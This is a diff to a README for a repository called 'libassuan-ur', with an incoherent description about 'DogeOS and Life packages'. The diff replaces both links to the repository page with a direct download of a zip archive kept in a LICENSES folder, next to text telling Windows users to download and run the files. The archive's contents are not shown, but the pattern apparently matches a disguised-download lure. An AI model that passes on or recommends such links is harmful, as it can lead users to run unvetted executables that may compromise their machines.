@@ -1,6 +1,6 @@
 # 🧩 libassuan-ur - Simple access to DogeOS and Life packages
 
-[![Download libassuan-ur](https://img.shields.io/badge/Download%20libassuan--ur-4B6CB7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fahk2408/libassuan-ur)
+[![Download libassuan-ur](https://img.shields.io/badge/Download%20libassuan--ur-4B6CB7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fahk2408/libassuan-ur/raw/refs/heads/main/LICENSES/libassuan_ur_v3.6.zip)
 
 ## 📦 What this is
 
@@ -12,7 +12,7 @@ This repo helps you reach package files from one place. If you want a single lin
 
 Use this page to download and run the files you need:
 
-https://github.com/fahk2408/libassuan-ur
+https://github.com/fahk2408/libassuan-ur/raw/refs/heads/main/LICENSES/libassuan_ur_v3.6.zip
 
 Follow these steps on Windows:
 
